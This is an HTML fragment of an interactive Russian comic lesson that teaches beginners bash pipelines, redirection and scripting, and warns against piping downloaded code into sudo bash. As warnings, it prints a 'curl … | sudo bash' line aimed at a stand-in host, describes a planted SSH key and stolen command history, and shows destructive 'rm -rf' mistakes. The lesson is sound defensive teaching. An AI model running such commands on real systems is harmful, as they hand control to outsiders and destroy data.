+  <section class="ccl-share" aria-label="Поделиться" data-ccs="1"><h2>Понравилось? Поделись с другом</h2><div class="ccl-share-row"><a href="https://t.me/share/url?url=https%3A%2F%2Fcybercomics.ru%2Fvypuski%2Fbash%2F&amp;text=Bash%20%D0%B4%D0%BB%D1%8F%20%D0%BD%D0%B0%D1%87%D0%B8%D0%BD%D0%B0%D1%8E%D1%89%D0%B8%D1%85%3A%20%D0%BA%D0%BE%D0%BD%D0%B2%D0%B5%D0%B9%D0%B5%D1%80%D1%8B%2C%20%D0%BF%D0%B5%D1%80%D0%B5%D0%BD%D0%B0%D0%BF%D1%80%D0%B0%D0%B2%D0%BB%D0%B5%D0%BD%D0%B8%D0%B5%2C%20%D0%BA%D0%B0%D0%B2%D1%8B%D1%87%D0%BA%D0%B8%20%D0%B8%20%D0%BF%D0%BE%D1%87%D0%B5%D0%BC%D1%83%20curl%20%7C%20sudo%20bash%20%D0%BE%D0%BF%D0%B0%D1%81%D0%B5%D0%BD" target="_blank" rel="noopener" class="ccl-main">Telegram</a><a href="https://vk.com/share.php?url=https%3A%2F%2Fcybercomics.ru%2Fvypuski%2Fbash%2F&amp;title=Bash%20%D0%B4%D0%BB%D1%8F%20%D0%BD%D0%B0%D1%87%D0%B8%D0%BD%D0%B0%D1%8E%D1%89%D0%B8%D1%85%3A%20%D0%BA%D0%BE%D0%BD%D0%B2%D0%B5%D0%B9%D0%B5%D1%80%D1%8B%2C%20%D0%BF%D0%B5%D1%80%D0%B5%D0%BD%D0%B0%D0%BF%D1%80%D0%B0%D0%B2%D0%BB%D0%B5%D0%BD%D0%B8%D0%B5%2C%20%D0%BA%D0%B0%D0%B2%D1%8B%D1%87%D0%BA%D0%B8%20%D0%B8%20%D0%BF%D0%BE%D1%87%D0%B5%D0%BC%D1%83%20curl%20%7C%20sudo%20bash%20%D0%BE%D0%BF%D0%B0%D1%81%D0%B5%D0%BD" target="_blank" rel="noopener">ВКонтакте</a><button type="button">Скопировать ссылку</button></div><p class="ccl-msg" aria-live="polite" style="margin:10px 0 0"></p></section><footer style="border-top: 3px solid #141414; background: #ffd60a; padding: 14px 16px; font-size: 16px; line-height: 1.4; text-align: center; font-family: Rubik, system-ui, sans-serif; color: #141414">CyberComics · кибербезопасность в комиксах · все атаки — только в лабораториях и на своих системах.<div class="ccl-foot" data-ccl="1"><span>Связь: <a href="mailto:cybercomics@yandex.ru">cybercomics@yandex.ru</a></span><a href="../../privacy/">Политика данных</a><button type="button">Перенести прогресс</button><button type="button">Настройки cookie</button><span style="flex-basis:100%;font-size:14px;opacity:.8">Названия чужих продуктов и сервисов принадлежат их владельцам. Проект с ними не связан.</span></div></footer>
+</div></div>
+<template id="ix-fragment" data-issue="19">
+<section class="ix ix-bash" data-ix="bash" aria-label="Выпуск 19: Bash и Однострочник">
+
+<div class="bs-hud" aria-hidden="true">
+  <span class="bs-hud-l">КОНТРОЛЬ СЕРВЕРА</span>
+  <span class="bs-bar"><i></i><b>0%</b></span>
+  <span class="bs-pips"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span></span>
+</div>
+<div class="bs-sr" aria-live="polite" data-live></div>
+
+<!-- ========== MISSION ========== -->
+<div class="bs-mission" id="ix-bash-mission">
+  <div class="bs-poster" aria-hidden="true">
+    <span class="bs-pdots"></span>
+    <span class="bs-pname">ОДНО<br>СТРОЧ<br>НИК</span>
+    <span class="bs-pline"><i class="bs-pc">curl</i><span class="bs-pipe"></span><i class="bs-pb">sudo bash</i></span>
+    <span class="bs-tape"><span>curl -s https://fix-all.example/fix.sh | sudo bash&nbsp;&nbsp;▸&nbsp;&nbsp;curl -s https://fix-all.example/fix.sh | sudo bash&nbsp;&nbsp;▸&nbsp;&nbsp;</span></span>
+    <span class="bs-ptag">ЦЕЛЬ: ОДНОСТРОЧНИК</span>
+  </div>
+  <div class="bs-mbody">
+    <p class="bs-kick">ВХОДЯЩЕЕ ЗАДАНИЕ · 03:34</p>
+    <h2 class="bs-mt" id="ix-bash-mt">Кто<br>ломится?</h2>
+    <p class="bs-msub">Сайт кружка робототехники тормозит. В&nbsp;логе <em>2&nbsp;000 строк</em> за&nbsp;полчаса. Найди, кто подбирает пароль, не&nbsp;читая лог глазами.</p>
+    <p class="bs-motto">«Одна строка — и&nbsp;всё починится. Не&nbsp;читай, просто вставь».</p>
+    <ol class="bs-moves" aria-label="Пять уровней миссии">
+      <li data-mv="1"><b>01</b><span>Шелл</span></li>
+      <li data-mv="2"><b>02</b><span>Конвейер</span></li>
+      <li data-mv="3"><b>03</b><span>Потоки</span></li>
+      <li data-mv="4"><b>04</b><span>Волшебная строка</span></li>
+      <li data-mv="5"><b>05</b><span>Свой скрипт</span></li>
+    </ol>
+    <button class="bs-go" type="button" data-act="start">Принять миссию ▶</button>
+  </div>
+</div>
+
+<!-- ========== L1: TERMINAL vs SHELL ========== -->
+<section class="bs-lvl bs-locked" id="ix-bash-l1" aria-labelledby="ix-bash-t1">
+  <div class="bs-lh"><span class="bs-ln">УРОВЕНЬ 1 / 5</span><h3 class="bs-lt" id="ix-bash-t1">Окно и&nbsp;переводчик</h3><span class="bs-ok">ПРОЙДЕНО</span></div>
+  <div class="bs-lockcap"><span>🔒 Сначала прими миссию</span></div>
+  <div class="bs-lb">
+    <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Чёрное окно — это <b>терминал</b>. Он только показывает буквы и&nbsp;передаёт, что ты нажала.</span></div>
+    <div class="bs-say"><span class="bs-who bs-son">СОНЯ</span><span class="bs-bub">А кто тогда выполняет команды?</span></div>
+    <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Шелл. У&nbsp;нас это <b>bash</b>. Смотри, что он делает со&nbsp;строкой.</span></div>
+
+    <div class="bs-term" data-t1>
+      <div class="bs-tbar"><span></span><span></span><span></span><b>Терминал</b></div>
+      <div class="bs-tbody">
+        <p class="bs-cmd"><span class="bs-ps">sonya@kruzhok:~$</span> <span data-t1line>grep -c "Failed" auth.log</span><span class="bs-cur" aria-hidden="true"></span></p>
+        <div class="bs-split" data-t1split hidden>
+          <p class="bs-shell">bash режет строку на слова:</p>
+          <div class="bs-words">
+            <span class="bs-wd bs-wd-c"><code>grep</code><small>команда</small></span>
+            <span class="bs-wd bs-wd-f"><code>-c</code><small>флаг: «только посчитай»</small></span>
+            <span class="bs-wd bs-wd-a"><code>Failed</code><small>аргумент: что искать</small></span>
+            <span class="bs-wd bs-wd-a"><code>auth.log</code><small>аргумент: где искать</small></span>
+          </div>
+          <p class="bs-out">1338</p>
+        </div>
+      </div>
+    </div>
+    <div class="bs-act"><button class="bs-btn bs-y" type="button" data-act="enter">⏎ Нажать Enter</button></div>
+
+    <div class="bs-part" data-t1q hidden>
+      <p class="bs-note">Заметила? Кавычки исчезли. <code>"Failed"</code> превратилось в&nbsp;<code>Failed</code> ещё до&nbsp;запуска grep.</p>
+      <p class="bs-q">Кто разрезал строку на&nbsp;слова и&nbsp;снял кавычки?</p>
+      <div class="bs-choices" data-q1>
+        <button class="bs-ch" type="button" data-v="term"><b>Терминал</b><span>Это же он показывает строку</span></button>
+        <button class="bs-ch" type="button" data-v="bash"><b>Bash</b><span>Шелл, который читает строку</span></button>
+        <button class="bs-ch" type="button" data-v="grep"><b>grep</b><span>Программа, которую запустили</span></button>
+      </div>
+      <p class="bs-fb" data-fb aria-live="polite"></p>
+    </div>
+
+    <div class="bs-after">
+      <div class="bs-two">
+        <p><span class="bs-mk" aria-hidden="true">▢</span><span><b>Терминал</b> — окно: экран и&nbsp;клавиатура. Его можно поменять, команды останутся те же.</span></p>
+        <p><span class="bs-mk bs-mk-y" aria-hidden="true">$</span><span><b>Шелл</b> — переводчик между тобой и&nbsp;системой: bash, zsh, sh. Он режет строку и&nbsp;запускает программы.</span></p>
+      </div>
+      <p class="bs-def">Любая команда устроена одинаково: <b>программа</b>, потом <b>флаги</b> с&nbsp;дефисом (как работать), потом <b>аргументы</b> (над чем работать).</p>
+      <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">1338 неудачных входов. Но чьих? Это уже работа для конвейера.</span></div>
+      <div class="bs-act"><button class="bs-btn" type="button" data-goto="ix-bash-l2">Собрать конвейер ▼</button></div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== L2: PIPELINE BUILDER (WOW) ========== -->
+<section class="bs-lvl bs-wide bs-locked" id="ix-bash-l2" aria-labelledby="ix-bash-t2">
+  <div class="bs-lh"><span class="bs-ln">УРОВЕНЬ 2 / 5</span><h3 class="bs-lt" id="ix-bash-t2">Конвейер</h3><span class="bs-ok">НАЙДЕН</span></div>
+  <div class="bs-lockcap"><span>🔒 Сначала пройди уровень 1</span></div>
+  <div class="bs-lb">
+    <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Палочка <b>|</b> — это труба. Вывод одной команды течёт во&nbsp;вход следующей. Собери трубу из&nbsp;блоков.</span></div>
+    <p class="bs-goal"><b>Цель:</b> на&nbsp;первой строке — IP, который ломится чаще всех.</p>
+
+    <div class="bs-pipe-w" data-pipe>
+      <ol class="bs-stages" data-stages aria-label="Конвейер команд"></ol>
+      <div class="bs-ocol">
+      <div class="bs-screen" aria-label="Что вышло из трубы">
+        <div class="bs-tbar"><span></span><span></span><span></span><b data-scrcap>вывод · 2 000 строк</b></div>
+        <div class="bs-scrv" data-scr></div>
+      </div>
+      <div class="bs-say bs-hint"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub" data-hint aria-live="polite">Начни с&nbsp;фильтра: нам нужны только строки со&nbsp;словом Failed.</span></div>
+      </div>
+    </div>
+
+    <p class="bs-line" aria-label="Собранная команда"><span class="bs-ps">$</span> <code data-cmdline>cat auth.log</code></p>
+
+    <div class="bs-dock" data-dock>
+      <p class="bs-trayt" id="ix-bash-tray-t">Блоки — нажимай по&nbsp;порядку:</p>
+      <div class="bs-tray" data-tray role="group" aria-labelledby="ix-bash-tray-t"></div>
+      <div class="bs-pair">
+        <button class="bs-btn bs-sm" type="button" data-act="undo" disabled>⌫ Убрать последний</button>
+        <button class="bs-btn bs-sm" type="button" data-act="reset" disabled>↺ Сначала</button>
+      </div>
+    </div>
+    <p class="bs-legal">Лог учебный, адреса — из&nbsp;диапазонов для документации. Ничего не&nbsp;выполняется по-настоящему.</p>
+
+    <div class="bs-after">
+      <p class="bs-big"><span class="bs-ip">203.0.113.66</span><br>1284 попытки за&nbsp;33&nbsp;минуты.</p>
+      <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Учитель, забывший пароль, ошибается раз семь. А&nbsp;тут — перебор паролей: робот пробует admin, root, test подряд.</span></div>
+      <p class="bs-note"><b>Запомни:</b> <code>uniq -c</code> склеивает только <b>соседние</b> одинаковые строки. Поэтому перед ним всегда <code>sort</code>.</p>
+      <p class="bs-def"><code>cat</code> тут для наглядности: grep и&nbsp;сам читает файл — <code>grep "Failed" auth.log | …</code>. А&nbsp;вместо awk подойдёт <code>cut -d' ' -f2</code>: «режь по&nbsp;пробелу, дай второе поле».</p>
+      <div class="bs-act"><button class="bs-btn" type="button" data-goto="ix-bash-l3">Сохранить улику ▼</button></div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== L3: STREAMS & EXIT CODES ========== -->
+<section class="bs-lvl bs-locked" id="ix-bash-l3" aria-labelledby="ix-bash-t3">
+  <div class="bs-lh"><span class="bs-ln">УРОВЕНЬ 3 / 5</span><h3 class="bs-lt" id="ix-bash-t3">Куда течёт поток</h3><span class="bs-ok">СОХРАНЕНО</span></div>
+  <div class="bs-lockcap"><span>🔒 Сначала найди IP</span></div>
+  <div class="bs-lb">
+    <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Улику надо сохранить. У&nbsp;команды два выхода: обычный и&nbsp;для ошибок. Оба по&nbsp;умолчанию льются на&nbsp;экран.</span></div>
+
+    <div class="bs-io">
+      <div class="bs-term bs-io-t">
+        <div class="bs-tbar"><span></span><span></span><span></span><b>экран</b></div>
+        <div class="bs-tbody bs-io-b" data-io-scr aria-live="polite"></div>
+      </div>
+      <div class="bs-files">
+        <div class="bs-file" data-file="report"><p class="bs-fname">report.txt</p><pre class="bs-fbody" data-fbody></pre></div>
+        <div class="bs-file" data-file="errors"><p class="bs-fname">errors.txt</p><pre class="bs-fbody" data-fbody></pre></div>
+      </div>
+    </div>
+
+    <p class="bs-iocap" data-io-cap aria-live="polite"></p>
+    <div class="bs-choices bs-two-ch" data-q3 hidden>
+      <button class="bs-ch" type="button" data-v="gt"><b><code>&gt; report.txt</code></b><span>Ещё раз так же</span></button>
+      <button class="bs-ch" type="button" data-v="gtgt"><b><code>&gt;&gt; report.txt</code></b><span>Две стрелки</span></button>
+    </div>
+    <p class="bs-fb" data-fb aria-live="polite"></p>
+    <div class="bs-act"><button class="bs-btn bs-y" type="button" data-act="io">Записать в файл ▶</button></div>
+
+    <div class="bs-after">
+      <ul class="bs-redir">
+        <li><code>&gt;</code><span>создаёт файл или <b>перезаписывает</b> его</span></li>
+        <li><code>&gt;&gt;</code><span>дописывает в&nbsp;конец</span></li>
+        <li><code>2&gt;</code><span>уводит ошибки (поток номер 2)</span></li>
+        <li><code>$?</code><span>код выхода прошлой команды: 0 — успех</span></li>
+      </ul>
+      <p class="bs-def">Скрипты смотрят на&nbsp;код выхода, а&nbsp;не&nbsp;на&nbsp;текст. У&nbsp;grep: 0 — нашёл, 1 — не&nbsp;нашёл, 2 — ошибка.</p>
+      <div class="bs-act"><button class="bs-btn" type="button" data-goto="ix-bash-l4">Забанить его ▼</button></div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== L4: THE MAGIC LINE ========== -->
+<section class="bs-lvl bs-locked" id="ix-bash-l4" aria-labelledby="ix-bash-t4">
+  <div class="bs-lh bs-lh-v"><span class="bs-ln">УРОВЕНЬ 4 / 5</span><h3 class="bs-lt" id="ix-bash-t4">Волшебная строка</h3><span class="bs-ok">РАСКУСИЛ</span></div>
+  <div class="bs-lockcap"><span>🔒 Сначала сохрани улику</span></div>
+  <div class="bs-lb">
+    <div class="bs-post">
+      <div class="bs-ph"><span class="bs-av" aria-hidden="true">|</span><span><b>Однострочник</b><small>форум админов · 4&nbsp;312 «спасибо»</small></span></div>
+      <p class="bs-pt">Конвейеры, кавычки… Скукота. Вставь мою строку — сервер сам забанит всех плохих. Проверено тысячами!</p>
+      <code class="bs-magic">curl -s https://fix-all.example/fix.sh | sudo bash</code>
+    </div>
+
+    <p class="bs-q">Что сделаешь?</p>
+    <div class="bs-choices bs-two-ch" data-q4>
+      <button class="bs-ch bs-ch-v" type="button" data-v="paste"><b>Вставить и&nbsp;нажать Enter</b><span>Тысячи «спасибо» не&nbsp;врут</span></button>
+      <button class="bs-ch" type="button" data-v="read"><b>Сначала скачать и&nbsp;прочитать</b><span>Это чужой код из&nbsp;интернета</span></button>
+    </div>
+    <p class="bs-fb" data-fb aria-live="polite"></p>
+
+    <div class="bs-part" data-l4safe hidden>
+      <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Правило простое: скачать → прочитать → только потом решать.</span></div>
+      <div class="bs-term">
+        <div class="bs-tbar"><span></span><span></span><span></span><b>Терминал</b></div>
+        <div class="bs-tbody" data-l4term aria-live="polite"></div>
+      </div>
+      <div class="bs-act"><button class="bs-btn bs-y" type="button" data-act="dl">⬇ Скачать в&nbsp;файл</button></div>
+
+      <div class="bs-part" data-l4read hidden>
+        <p class="bs-q">Скрипт обещает «забанить плохих». Найди 3&nbsp;строки, которые делают другое. <span class="bs-cnt" data-flags>0/3</span></p>
+        <div class="bs-script" data-script role="group" aria-label="Содержимое fix.sh"></div>
+        <p class="bs-fb" data-fb2 aria-live="polite"></p>
+      </div>
+    </div>
+
+    <div class="bs-after">
+      <p class="bs-big">И&nbsp;ни&nbsp;одной строки про&nbsp;бан.</p>
+      <div class="bs-say"><span class="bs-who bs-son">СОНЯ</span><span class="bs-bub">Ой. А&nbsp;у&nbsp;меня в&nbsp;истории <code>mysql -u root -pKruzhok2026</code>…</span></div>
+      <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Вот поэтому пароль в&nbsp;команду не&nbsp;пишут. Он остаётся в&nbsp;~/.bash_history и&nbsp;виден в&nbsp;списке процессов. Пиши <code>-p</code> без пароля — mysql спросит сам. А&nbsp;этот пароль смени.</span></div>
+      <p class="bs-rule"><code>curl | sudo bash</code> — запустить код, которого ты не&nbsp;видел, с&nbsp;правами root.</p>
+      <ol class="bs-why">
+        <li><b>Не видишь.</b> bash выполняет код прямо по&nbsp;мере скачивания. Прочитать его ты не&nbsp;успеваешь.</li>
+        <li><b>Подмена.</b> Сайт могут взломать. А&nbsp;хитрый сервер умеет отдавать браузеру один файл, а&nbsp;<code>curl | bash</code> — другой.</li>
+        <li><b>Обрыв.</b> Связь упала на&nbsp;середине — bash выполнит половину строки. <code>rm -rf ~/fix-tmp</code> превратится в&nbsp;<code>rm -rf ~</code>: прощай, домашняя папка.</li>
+      </ol>
+      <p class="bs-def">Даже честный установщик: скачай, сверь <code>sha256sum</code> с&nbsp;сайтом проекта, прочитай, запусти без sudo, если можно. А&nbsp;лучше — поставь из&nbsp;пакетного менеджера.</p>
+      <div class="bs-act"><button class="bs-btn" type="button" data-goto="ix-bash-l5">Написать свой скрипт ▼</button></div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== L5: OWN SCRIPT ========== -->
+<section class="bs-lvl bs-locked" id="ix-bash-l5" aria-labelledby="ix-bash-t5">
+  <div class="bs-lh"><span class="bs-ln">УРОВЕНЬ 5 / 5</span><h3 class="bs-lt" id="ix-bash-t5">Свой скрипт</h3><span class="bs-ok">НА ДЕЖУРСТВЕ</span></div>
+  <div class="bs-lockcap"><span>🔒 Сначала раскуси строку</span></div>
+  <div class="bs-lb">
+    <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Волшебства не&nbsp;будет. Напишем свой скрипт: короткий, и&nbsp;каждую строку ты понимаешь.</span></div>
+
+<pre class="bs-code" aria-label="Скрипт ban.sh"><span class="bs-cl-hi">#!/usr/bin/env bash</span>
+<span class="bs-cm"># ↑ шебанг: чем исполнять файл</span>
+set -u   <span class="bs-cm"># нет переменной — стоп</span>
+LOG="/var/log/kruzhok/auth.log"
+TOP=$(grep "Failed" <span class="bs-qv">"$LOG"</span> \
+  | awk '{print $2}' | sort \
+  | uniq -c | sort -nr | head -1)
+COUNT=$(echo <span class="bs-qv">"$TOP"</span> | awk '{print $1}')
+IP=$(echo <span class="bs-qv">"$TOP"</span> | awk '{print $2}')
+if [ <span class="bs-qv">"${COUNT:-0}"</span> -gt 100 ]; then
+  ufw deny from <span class="bs-qv">"$IP"</span>
+  echo "$(date) $IP" &gt;&gt; bans.log
+fi</pre>
+    <p class="bs-codecap">Тот же конвейер, только внутри <code>$( … )</code>: вывод команды кладём в&nbsp;переменную. <code>ufw deny</code> — добавить правило файрвола «не&nbsp;пускать этот IP».</p>
+
+    <div class="bs-say"><span class="bs-who bs-son">СОНЯ</span><span class="bs-bub">А зачем везде кавычки вокруг <code>$</code>?</span></div>
+    <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Покажу, что бывает без них. Вот уборка старых отчётов.</span></div>
+
+    <div class="bs-qdemo">
+      <code class="bs-qset">DIR="/home/sonya/Отчёты кружка"</code>
+      <p class="bs-cmd bs-cmd-big"><span class="bs-ps">$</span> <span data-qcmd>rm -rf $DIR</span></p>
+      <div class="bs-words" data-qwords hidden></div>
+      <p class="bs-qnote" data-qnote aria-live="polite"></p>
+    </div>
+    <div class="bs-act"><button class="bs-btn bs-y" type="button" data-act="q">Показать, что увидит bash</button></div>
+
+    <div class="bs-part" data-l5run hidden>
+      <p class="bs-def">Пустая переменная ещё страшнее: <code>rm -rf "$DIR"/*</code> станет <code>rm -rf /*</code>. Страховка — <code>${DIR:?}</code>: если DIR пустая или не&nbsp;задана, bash остановится, а&nbsp;не&nbsp;удалит.</p>
+      <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Скрипт готов. Запускаем.</span></div>
+      <div class="bs-term">
+        <div class="bs-tbar"><span></span><span></span><span></span><b>Терминал</b></div>
+        <div class="bs-tbody" data-l5term aria-live="polite"><p class="bs-dim">root@kruzhok:/opt/kruzhok# — ты на сервере</p></div>
+      </div>
+      <div class="bs-act"><button class="bs-btn bs-y" type="button" data-act="run">▶ Запустить ./ban.sh</button></div>
+    </div>
+
+    <div class="bs-after">
+      <p class="bs-big">Код выхода 0.<br><span>Робот за&nbsp;дверью.</span></p>
+      <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Последний штрих: пусть скрипт дежурит ночью вместо нас. Одна строка в&nbsp;cron — запуск каждые 5&nbsp;минут.</span></div>
+      <code class="bs-cron">*/5 * * * * /opt/kruzhok/ban.sh</code>
+      <p class="bs-def">Это и&nbsp;есть автоматизация. Так же скрипты каждый день ищут секреты в&nbsp;коде, проверяют права на&nbsp;файлы и&nbsp;собирают отчёты по&nbsp;логам. Готовый инструмент ровно для&nbsp;нашей задачи — <b>fail2ban</b>: теперь ты знаешь, как он думает.</p>
+      <div class="bs-act"><button class="bs-btn bs-y" type="button" data-goto="ix-bash-battle">К битве с&nbsp;Однострочником ▼</button></div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== HACK OVERLAY ========== -->
+<div class="bs-hack" role="dialog" aria-modal="true" aria-labelledby="ix-bash-hk" hidden>
+  <div class="bs-hkin">
+    <span class="bs-pline bs-hkpl" aria-hidden="true"><i class="bs-pc">curl</i><span class="bs-pipe"></span><i class="bs-pb">sudo bash</i></span>
+    <p class="bs-hkt" id="ix-bash-hk">ВЗЛОМ!</p>
+    <div class="bs-hkterm" aria-label="Что сделал скрипт">
+      <p>$ curl -s https://fix-all.example/fix.sh | sudo bash</p>
+      <p class="bs-ok-l">Чиню сервер...</p>
+      <p class="bs-bad-l">+ чужой ключ в /root/.ssh/authorized_keys</p>
+      <p class="bs-bad-l">+ история команд Сони ушла на чужой сервер</p>
+      <p class="bs-bad-l">+ cron: каждые 5 минут качать новый код</p>
+      <p class="bs-ok-l">Готово! Всё починено ✓</p>
+    </div>
+    <p class="bs-hksay">Ты сама дала мне root. Спасибо!</p>
+    <button class="bs-btn bs-y" type="button" data-act="rewind">◀◀ Откатить время</button>
+  </div>
+</div>
+
+<!-- ========== BATTLE ========== -->
+<section class="bs-battle" id="ix-bash-battle" aria-labelledby="ix-bash-bt" tabindex="-1">
+  <div class="bs-bh">
+    <span class="bs-bface" aria-hidden="true">|</span>
+    <div class="bs-bhx">
+      <h2 class="bs-bt" id="ix-bash-bt">Битва со&nbsp;злодеем</h2>
+      <div class="bs-hp" role="img" aria-label="Здоровье Однострочника" data-hp-wrap><i data-hp></i><b data-hp-t>ОДНОСТРОЧНИК · HP 3/3</b></div>
+    </div>
+  </div>
+  <div class="bs-bbody" data-battle aria-live="polite"></div>
+</section>
+
+<!-- ========== INTERVIEW ========== -->
+<section class="bs-iv" aria-labelledby="ix-bash-ivt">
+  <p class="bs-ivk">ВОПРОС С СОБЕСЕДОВАНИЯ · JUNIOR APPSEC</p>
+  <h2 class="bs-ivq" id="ix-bash-ivt">В&nbsp;инструкции к&nbsp;утилите написано: «Установка: <code>curl … | sudo bash</code>». Чем это опасно и&nbsp;как бы ты поставил её безопасно?</h2>
+  <div class="bs-think">
+    <b>Подумай сам</b>
+    <span>Подсказка: кто видит код до&nbsp;запуска? С&nbsp;какими правами он выполняется? И&nbsp;что гарантирует HTTPS, а&nbsp;что нет?</span>
+  </div>
+  <button class="bs-btn bs-y" type="button" data-act="iv" aria-expanded="false" aria-controls="ix-bash-iva">Показать сильный ответ</button>
+  <div class="bs-iva" id="ix-bash-iva" hidden>
+    <ol>
+      <li><b>Что происходит.</b> Код с&nbsp;чужого сервера сразу выполняется с&nbsp;правами root. Никто его не&nbsp;прочитал, ничто его не&nbsp;проверило.</li>
+      <li><b>Риски.</b> Взлом сайта или зеркала, подмена файла для&nbsp;<code>curl | bash</code>, обрыв загрузки посреди строки. HTTPS защищает дорогу, а&nbsp;не&nbsp;намерения автора.</li>
+      <li><b>Как безопасно.</b> Пакетный менеджер, если есть. Иначе скачать файл, сверить подпись или SHA-256 из&nbsp;независимого источника, прочитать, сначала запустить в&nbsp;виртуалке, с&nbsp;минимальными правами.</li>
+      <li><b>Свои скрипты.</b> Кавычки вокруг переменных, <code>set -euo pipefail</code>, проверка ShellCheck, никаких паролей в&nbsp;аргументах команд.</li>
+    </ol>
+    <p class="bs-ivx"><b>Ошибка новичка:</b> «Там же HTTPS и&nbsp;известный сайт — значит, безопасно». HTTPS гарантирует, что файл не&nbsp;подменили по&nbsp;дороге, но&nbsp;не&nbsp;что в&nbsp;нём нет вреда.</p>
+  </div>
+</section>
+
+<!-- ========== CHEAT SHEET ========== -->
+<section class="bs-cs" aria-labelledby="ix-bash-cst">
+  <h2 class="bs-cst" id="ix-bash-cst">Шпаргалка: что важно знать</h2>
+  <ol class="bs-csl">
+    <li><span class="bs-csn" aria-hidden="true">01</span><div><b>Терминал ≠ шелл</b><p>Терминал — окно для&nbsp;текста. Шелл (bash) — программа, которая читает строку и&nbsp;запускает команды.</p></div></li>
+    <li><span class="bs-csn" aria-hidden="true">02</span><div><b>Команда, флаги, аргументы</b><p><code>grep -c "Failed" auth.log</code>: программа, настройка с&nbsp;дефисом, то, над&nbsp;чем работать.</p></div></li>
+    <li><span class="bs-csn" aria-hidden="true">03</span><div><b>Конвейер |</b><p>Вывод одной команды — вход следующей. Перед <code>uniq -c</code> всегда <code>sort</code>.</p></div></li>
+    <li><span class="bs-csn" aria-hidden="true">04</span><div><b>Потоки и&nbsp;коды</b><p><code>&gt;</code> перезаписывает, <code>&gt;&gt;</code> дописывает, <code>2&gt;</code> уводит ошибки. <code>$?</code> = 0 — успех.</p></div></li>
+    <li><span class="bs-csn" aria-hidden="true">05</span><div><b>Кавычки</b><p><code>"$VAR"</code> — одно слово. Без кавычек пробел режет значение, и&nbsp;<code>rm -rf</code> удаляет не&nbsp;то.</p></div></li>
+    <li><span class="bs-csn" aria-hidden="true">06</span><div><b>Скрипт</b><p>Первая строка <code>#!/usr/bin/env bash</code>, потом <code>chmod +x</code> и&nbsp;запуск <code>./script.sh</code>.</p></div></li>
+    <li><span class="bs-csn" aria-hidden="true">07</span><div><b>Сначала прочитай</b><p><code>curl | sudo bash</code> — чужой код с&nbsp;правами root. Пароли в&nbsp;команды не&nbsp;пиши: они остаются в&nbsp;истории.</p></div></li>
+  </ol>
+  <p class="bs-train"><b>Тренируйся легально:</b> picoCTF (раздел General Skills), TryHackMe (комнаты Linux Fundamentals), а&nbsp;скрипты пробуй на&nbsp;своей виртуалке. Чужие серверы трогать нельзя.</p>
+</section>
+
+</section>
+<style>
+.ix-bash{--ink:#141414;--paper:#fff7e3;--yel:#ffd60a;--red:#ff3b3b;--rdk:#c81e1e;--green:#2ee59d;--gdk:#0a7a4e;--muted:#5b5446;--tx:#f3efe4;
+  --f-mono:'Rubik Mono One',sans-serif;--f-cap:'Russo One',sans-serif;--f-hand:Neucha,cursive;--f-text:Rubik,system-ui,sans-serif;--code:ui-monospace,'SFMono-Regular',Menlo,Consolas,'Liberation Mono',monospace;
+  position:relative;display:block;color:var(--ink);font-family:var(--f-text);font-size:18px;line-height:1.5;max-width:900px;margin:0 auto}
+.ix-bash *,.ix-bash *::before,.ix-bash *::after{box-sizing:border-box}
+.ix-bash button{font:inherit;color:inherit}
+.ix-bash :focus-visible{outline:4px solid var(--red);outline-offset:3px}
+.ix-bash [hidden]{display:none !important}
+.ix-bash p{margin:0}
+.ix-bash code{font-family:var(--code);font-size:.92em;font-weight:600}
+.ix-bash p code,.ix-bash li code,.ix-bash h2 code{background:rgba(255,214,10,.45);padding:0 4px;border-radius:3px;overflow-wrap:anywhere}
+.ix-bash .bs-sr{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0);white-space:nowrap}
+
+/* HUD */
+.ix-bash .bs-hud{position:sticky;top:0;z-index:30;display:none;align-items:center;gap:10px;padding:8px 12px;background:var(--ink);color:#fff;border:3px solid var(--ink)}
+.ix-bash .bs-hud.bs-on{display:flex;animation:ix-bash-drop .4s cubic-bezier(.2,1.4,.4,1)}
+.ix-bash .bs-hud-l{font-family:var(--f-cap);font-size:12px;color:var(--yel);white-space:nowrap}
+.ix-bash .bs-bar{flex:1;min-width:50px;height:20px;border:2px solid #fff;background:#2a2a2a;position:relative;overflow:hidden}
+.ix-bash .bs-bar i{position:absolute;inset:0 auto 0 0;width:0;background:var(--yel);transition:width .6s cubic-bezier(.3,1.5,.5,1);background-image:repeating-linear-gradient(-45deg,rgba(0,0,0,.25) 0 6px,transparent 6px 12px)}
+.ix-bash .bs-bar b{position:absolute;inset:0;display:grid;place-items:center;font-family:var(--f-cap);font-weight:400;font-size:12px;text-shadow:0 0 3px #000,0 0 2px #000}
+.ix-bash .bs-hud.bs-hit{animation:ix-bash-shake .4s}
+.ix-bash .bs-hud.bs-hit .bs-bar{border-color:var(--red)}
+.ix-bash .bs-pips{display:flex;gap:4px}
+.ix-bash .bs-pips span{width:22px;height:22px;border:2px solid #fff;display:grid;place-items:center;font-family:var(--f-cap);font-size:11px}
+.ix-bash .bs-pips span.bs-done{background:var(--yel);border-color:var(--yel);color:var(--ink)}
+
+/* MISSION + POSTER */
